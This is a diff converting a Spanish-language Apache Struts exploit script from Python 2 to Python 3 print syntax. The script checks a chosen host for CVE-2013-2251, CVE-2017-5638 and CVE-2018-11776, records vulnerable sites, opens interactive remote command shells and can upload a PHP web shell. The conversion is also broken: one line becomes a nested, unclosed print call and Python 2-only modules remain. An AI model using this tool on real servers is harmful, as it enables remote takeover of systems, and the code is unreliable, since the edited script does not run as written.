@@ -1,4 +1,5 @@
 #!/usr/bin/python
+from __future__ import print_function
 import requests
 import urllib2
 import urllib
@@ -9,6 +10,11 @@ import commands
 import readline
 import urlparse
 import ssl
+
+try:
+    raw_input          # Python 2
+except NameError:
+    raw_input = input  # Python 3
 
 RED = '\033[1;31m'
 BLUE = '\033[94m'
@@ -33,9 +39,9 @@ logo = BLUE+'''
         =[ Command Execution v3]=
               By @s1kr10s                                                                                                            
 '''+ENDC
-print logo
+print(logo)
 		
-print " * Ejemplo: http(s)://www.victima.com/files.login\n"
+print(" * Ejemplo: http(s)://www.victima.com/files.login\n")
 host = raw_input(BOLD+" [+] HOST: "+ENDC)
 context = ssl._create_unverified_context()
 
@@ -70,24 +76,24 @@ if len(host) > 0:
 			response = urllib.urlopen(host+poc, context=context)
 			response = response.read()
 		except:
-			print RED+" Servidor no responde\n"+ENDC
+			print(print(RED+" Servidor no responde\n"+ENDC
 			exit(0)
 
-		print BOLD+"\n [+] EJECUTANDO EXPLOIT CVE-2013-2251"+ENDC
+		print(BOLD+"\n [+] EJECUTANDO EXPLOIT CVE-2013-2251"+ENDC)
 
 		if response.find(".getWriter") == -1:
 			if response.find("mamalo") != -1:
-				print RED+"   [-] VULNERABLE"+ENDC
+				print(RED+"   [-] VULNERABLE"+ENDC)
 				owned = open('vulnsite.txt', 'a')
 				owned.write(str(host)+'\n')
 				owned.close()
 
 				opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
 				if opcion == 's':
-					print YELLOW+"   [-] GET PROMPT...\n"+ENDC
+					print(YELLOW+"   [-] GET PROMPT...\n"+ENDC)
 					time.sleep(1)
-					print BOLD+"   * [UPLOAD SHELL]"+ENDC
-					print OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC
+					print(BOLD+"   * [UPLOAD SHELL]"+ENDC)
+					print(OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC)
 
 					while 1:
 						separador = raw_input(GREEN+"Struts2@Shell_1:$ "+ENDC)
@@ -96,7 +102,7 @@ if len(host) > 0:
 
 						if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
 							shell = urllib.urlopen(host+exploit1("'"+str(comando)+"'"), context=context)
-							print "\n"+shell.read()
+							print("\n"+shell.read())
 						elif espacio[0] == 'pwnd':
 							pathsave=raw_input("path EJ:/tmp/: ")
 
@@ -105,13 +111,13 @@ if len(host) > 0:
 								urllib2.urlopen(host+pwnd(str(shellfile)))
 								shell = urllib.urlopen(host+exploit1("'ls','-l','"+pathsave+"status.php'"), context=context)
 								if shell.read().find(pathsave+"status.php") != -1:
-									print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
+									print(BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC)
 								else:
-									print BOLD+RED+"\nNo Create File :/\n"+ENDC
+									print(BOLD+RED+"\nNo Create File :/\n"+ENDC)
 
 		# CVE-2017-5638 ---------------------------------------------------------------------------------					
-		print BLUE+"     [-] NO VULNERABLE"+ENDC			
-		print BOLD+" [+] EJECUTANDO EXPLOIT CVE-2017-5638"+ENDC
+		print(BLUE+"     [-] NO VULNERABLE"+ENDC)
+		print(BOLD+" [+] EJECUTANDO EXPLOIT CVE-2017-5638"+ENDC)
 		x = 0
 		while x < len(validador()):
 			valida = validador()[x]
@@ -121,14 +127,14 @@ if len(host) > 0:
 				result = urllib2.urlopen(req).read()
 
 			  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find(" netmask ") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("User accounts for") != -1 or result.find("de usuario de") != -1:
-			  		print RED+"   [-] VULNERABLE"+ENDC
+			  		print(RED+"   [-] VULNERABLE"+ENDC)
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
 					owned.close()
 
 					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
 					if opcion == 's':
-						print YELLOW+"   [-] GET PROMPT...\n"+ENDC
+						print(YELLOW+"   [-] GET PROMPT...\n"+ENDC)
 						time.sleep(1)
 
 					  	while 1:
@@ -136,20 +142,20 @@ if len(host) > 0:
 								separador = raw_input(GREEN+"\nStruts2@Shell_2:$ "+ENDC)
 								req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(separador))})
 								result = urllib2.urlopen(req).read()
-								print "\n"+result
+								print("\n"+result)
 							except:
 								exit(0)
 					else:
 						x = len(validador())
 				else:
-					print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
+					print(BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x))
 			except:
 				pass
 			x=x+1
 
 		# CVE-2018-11776 ---------------------------------------------------------------------------------
-		print BLUE+"     [-] NO VULNERABLE"+ENDC			
-		print BOLD+" [+] EJECUTANDO EXPLOIT CVE-2018-11776"+ENDC
+		print(BLUE+"     [-] NO VULNERABLE"+ENDC)
+		print(BOLD+" [+] EJECUTANDO EXPLOIT CVE-2018-11776"+ENDC)
 		x = 0
 		while x < len(validador()):
 			#Filtramos la url solo dominio
@@ -171,14 +177,14 @@ if len(host) > 0:
 				result = requests.get(site+"/"+exploit3(str(valida))+file_path).text
 
 				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find(" netmask ") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("User accounts for") != -1 or result.find("de usuario de") != -1:
-			  		print RED+"   [-] VULNERABLE"+ENDC
+			  		print(RED+"   [-] VULNERABLE"+ENDC)
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
 					owned.close()
 
 					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
 					if opcion == 's':
-						print YELLOW+"   [-] GET PROMPT...\n"+ENDC
+						print(YELLOW+"   [-] GET PROMPT...\n"+ENDC)
 						time.sleep(1)
 
 					  	while 1:
@@ -187,19 +193,19 @@ if len(host) > 0:
 							comando = "%20".join(espacio)
 
 							shell = requests.get(site+"/"+exploit3(str(comando))+file_path)
-							print "\n"+shell.text
+							print("\n"+shell.text)
 					else:
 						x = len(validador())
 						exit(0)
 				else:
-					print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
+					print(BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x))
 			except:
 				pass
 			x=x+1
 	else:
-		print RED+" Debe introducir el protocolo (https o http) para el dominio\n"+ENDC
+		print(RED+" Debe introducir el protocolo (https o http) para el dominio\n"+ENDC)
 		exit(0)
 else:
-	print RED+" Debe Ingresar una Url\n"+ENDC
+	print(RED+" Debe Ingresar una Url\n"+ENDC)
 	exit(0)
 
